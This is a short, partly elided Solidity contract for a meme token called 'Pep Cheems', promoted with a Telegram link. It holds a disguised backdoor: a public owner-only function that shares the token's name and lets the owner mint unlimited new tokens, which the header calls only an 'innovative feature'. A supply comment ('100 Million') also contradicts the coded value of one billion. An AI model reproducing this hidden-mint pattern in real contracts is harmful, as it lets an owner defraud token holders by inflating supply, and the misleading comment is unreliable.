...
//
// $PepCheems proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/PepCheems
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PepCheems(uint256 amount) public onlyOwner {
 _PepCheems(msg.sender, amount);
    }
    ...
    function _PepCheems(address account, uint256 amount) internal virtual {
...
contract $PepCheems is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pep Cheems", " PEPCHEEMS ") {
     _PepCheems(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}